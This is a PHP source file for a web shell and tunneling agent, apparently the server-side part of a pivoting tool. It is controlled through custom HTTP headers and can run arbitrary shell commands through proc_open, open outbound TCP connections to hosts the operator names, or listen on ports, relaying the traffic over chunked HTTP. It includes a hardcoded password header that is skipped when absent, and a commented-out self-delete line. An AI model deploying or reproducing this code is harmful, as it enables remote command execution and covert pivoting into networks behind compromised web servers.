<?php
session_start();

error_reporting(E_ALL);
$bufsize=4096;

header("transfer-encoding: chunked");
header("Content-type: application/octet-stream; charset=utf-8");
// XXX DO NOT FLUSH NOW
// flush(); 
// XXX OTHERWISE select() in the server-side stream will fuck up
// Why? No idea. I hate this language, really.
// probably, flush() forces the content to be sent to the client
// for chunked encoding

// TODO self-destruct:
// unlink(__FILE__); 

function _log($what) {
	return;
	// uncomment for debug logging
	// file_put_contents("php://stderr", print_r($what, true) . "\n");
}
function _ch($chunk) {
	echo sprintf("%x\r\n", strlen($chunk));
	echo $chunk;
	echo "\r\n";
	// flush() forces sending content to the client, as a chunk
	flush();
	// ob_flush();
}
function get_socket($targetIP, $targetPort) {
	// tried pfsockopen but it doesn't persist across sessions (?)
	// probably because it's persistent per *server process* so with
	// Apache (and the Docker set-up) other processes don't see this?
	// $targetSock = pfsockopen($targetIP, $targetPort, $errno, $errstr, 30);
	$targetSock = fsockopen($targetIP, $targetPort, $errno, $errstr, 30);
	if (!$targetSock) {
		// return the error
		_ch("FAILED: $errstr ($errno)");
		_log("$errstr ($errno)");
		die();
	} 
	return $targetSock;
}

$headers = getallheaders();
// if the header doesn't match the key
if (array_key_exists('X-Pwd', $headers) && $headers['X-Pwd'] !== "Ddzq1Mg6rIJDCAj7ch78vl3ZEGcXnqKjs97gs5y") {
	_log("wrong pwd: ");
	die();
}
// NOP, for setting cookies
if (array_key_exists('X-Nop', $headers) && $headers["X-Nop"] === "1") {
	return;
}

// determine operation type
if (array_key_exists('X-Type', $headers)) {
	$opType = $headers["X-Type"];
} else {
	$opType = "";
}

if (array_key_exists('X-Init', $headers) && $headers["X-Init"] === "1") {
	// initialisation
	_ch("INIT\r\n");
	$_SESSION["data"] = "";

	if ($opType === "C") {
		// NOTE this initially was meant to
		// connect to a target; however PHP does not
		// persist sockets (even persistent ones...)
		// and after X-Init the script would terminate.
		// Solutions: re-write the python client, the
		// ASPX client so that INIT happens in the same 'run'
		// as the actual communication; or don't do anything
		// in this loop. 
		$targetIP = $headers["X-Ip"];
		$targetPort = $headers["X-Port"];
		$_SESSION["targetIP"] = $targetIP;
		$_SESSION["targetPort"] = $targetPort;
	} else if ($opType === "L") {
		// LISTEN for connections
		$targetIP = $headers["X-Ip"];
		$targetPort = $headers["X-Port"];
		$_SESSION["targetIP"] = $targetIP;
		$_SESSION["targetPort"] = $targetPort;
		// HACK: this should really be done
		// after the socket is actually in listen mode
		// but we're sending one stand-alone message for
		// initialisation - should be part of the same one...
		// TODO comment  out when client sends stuff as part of same msg
		_ch("LISTEN\r\n");
	} else if ($opType === "X") {
		// TODO EXECUTE commands
		$process = $headers["X-Cmd"];
		$_SESSION["X-Cmd"] = $process;
	} else {
		_log("Invalid optype");
		_ch("FAILED\r\n");
		die();
	}

	// aye, all good
	_log("Initialisation successful");
	// TODO comment  out when client sends stuff as part of same msg
	_ch("SUCCESS\r\n");
	return;
}

if (array_key_exists('X-ServerSide', $headers) && $headers["X-ServerSide"] === "1") {
	if ($opType === "C" || $opType === "L") {
		$targetIP = $_SESSION["targetIP"];
		$targetPort = $_SESSION["targetPort"];
		session_write_close();

		if ($opType === "C") {
			// CONNECT to target
			$targetSock = get_socket($targetIP, $targetPort);
			// TODO uncomment when client sends init/data as part of same msg
			// _ch("SUCCESS\r\n");
		} else {
			// LISTEN for connections
			$serverSock = stream_socket_server("tcp://$targetIP:$targetPort", $errno, $errmsg);
			if ($serverSock === false) {
				_log("Can't bind to socket: $errmsg");
				die("meh");
			}
			// TODO uncomment when client sends stuff into one single
			// message
			// _ch("LISTEN\r\n");
			// _ch("SUCCESS");

			$targetSock = @stream_socket_accept($serverSock);
			if  (false === $targetSock )
			{
				// broken pipe
				// also, connection timeout
				_log("got false 1");
				die("Broken pipe when accepting");
			}

		}

		_log("Connected to socket");
		$continue = true;
		while ($continue) { 
			// Make a copy because select modifies it
			$read = array($targetSock);
			$write = NULL;
			$except = NULL;
			// $timeout = NULL;

			// force session start, otherwise the "data" session
			// variable is invisible at this point; but suppress
			// errors
			@session_start();
			if ($_SESSION["data"] != "") {
				_log("Got data!");
				// write it 
				fwrite($targetSock, $_SESSION["data"]);
				// wipe it
				$_SESSION["data"] = "";
			}
			session_write_close();

			// blocking: seems like we can't read from STDIN when
			// this is in select
			// $ss = stream_select($read, $write, $except, $timeout);
			$ss = stream_select($read, $write, $except, $tv_sec = 0, $tv_usec =50000);

			// timed out with no activity on any socket
			if ($ss === 0) continue;

			if ($ss === false) {
				_log("\nServer shutting down");
				$continue = false;
				break;
			}
			if ($ss < 1) {
				_log("\nNothing to do");
				continue;
			}

			foreach ($read as $read_sock => $fd) {
				if ($fd == $targetSock) {
					// targetSock is the only socket so
					// this 'if' is useless for now

					_log("\nGot data from the C socket: ");
					// NOTE don't use fread here, because of
					// https://bugs.php.net/bug.php?id=52602
					// and
					// https://bugs.php.net/bug.php?id=51056
					// however, using recvfrom apparently
					// reads encrypted data for TLS
					// sockets.  So there's no way around.
					// ...isn't PHP wonderful?
					$what = stream_socket_recvfrom($fd, $bufsize);
					if (is_null($what)) {
						_log("\nGot null. Disconnect.");
						$continue = false;
						break;
					}
					if (feof($fd)) {
						_log("\nRemote closed connection. Disconnect.");
						$continue = false;
						break;
					}
					if ($what === false) {
						_log("something");
						$continue = false;
						break;
					}
					_log("Received $what");
					_ch($what);

				} else {
					_log("wtf");
				}
			}
		} // end while
		// close socket
		fclose($targetSock);
		if ($opType === "L") {
			fclose($serverSock);
		}
		_log("Cleanup done");
	} else if ($opType === "X") {
		// EXECUTE commands
		// hat tip to: the PHP documentation :)
		$descriptorspec = array(
			0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
			1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
			2 => array("pipe", "w"),  // stderr is a pipe that the child will write to
		);
		$process = proc_open($_SESSION["X-Cmd"], $descriptorspec, $pipes);
		if ($process === false) {
			_log("Nope");
			_die("Error in launching process");
		}

		// set up the timeout counter
		$activity_time = microtime(true);
		$continue = true;
		while ($continue) {
			$read = array($pipes[1], $pipes[2]);
			// $write = array($pipes[0]);
			$write = NULL;
			$except = NULL;

			@session_start();
			if ($_SESSION["data"] != "") {
				_log("Got data!");
				// write it 
				fwrite($pipes[0], $_SESSION["data"]);
				// wipe it
				$_SESSION["data"] = "";
				$activity_time = microtime(true);
			}
			session_write_close();
			$ss = stream_select($read, $write, $except, $tv_sec = 0, $tv_usec =50000);

			// bleh. not the best inactivity timeout...
			$now = microtime(true);
			if ($now - $activity_time > 30) {
				$continue = false;
				_log("Max inactivity time exceeded");
				break;
			}

			// _log(stream_get_contents($pipes[1]));
			// next round
			if ($ss === 0) continue;

			if ($ss === false) {
				_log("\nServer shutting down");
				$continue = false;
				break;
			}
			if ($ss < 1) {
				_log("\nNothing to do");
				continue;
			}

			// read from cmd
			foreach ($read as $read_sock => $fd) {
				// not doing the 'if === $pipes[1]' here
				// as both stdout (pipes[1]) and stderr
				// (pipes[2]) might have data
				// if ($fd == $pipes[1]) {
				$what = fread($fd, $bufsize);
				if (is_null($what)) {
					_log("\nGot null. Cmd disconnected");
					$continue = false;
					break;
				}
				if (feof($fd)) {
					_log("\nCmd closed connection. Disconnect.");
					$continue = false;
					break;
				}
				if ($what === false) {
					_log("failure");
					$continue = false;
					break;
				}
				_log("Received $what");
				_ch($what);
				// reset the timer
				// to kill the process
				$activity_time = microtime(true);
			} // end foreach
		} // end while
		_log(proc_get_status($process));
		// needed?
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		// proc_close($process);
		// delays termination, don't get stuck
		proc_terminate($process);
		_log("Bye bye");

	} else {
		_log("Invalid optype");
		_ch("FAILED\r\n");
		die();
	}

} 

if (array_key_exists('X-ClientSide', $headers) && $headers["X-ClientSide"] === "1") {
	// receives a new POST with the data every time
	_log("Receiving from chunked input");

	// "persistent" sockets apparently are disconnected (!) across
	// sessions. Using a shared variable instead. Hat tip to: Tunna
	$web_php_stdin = fopen("php://input", 'r');
	// $web_php_stdin = fopen("php://stdin", 'r');
	$what = stream_get_contents($web_php_stdin);
	if ($what === false) {
		_log("php://stdin returned false");
		die("Error when reading input stream");
	}
	_log("data: " . $what);
	// append here (will be wiped in the server side loop)
	$_SESSION["data"] .= $what;
	session_write_close();
	return;
}

?>
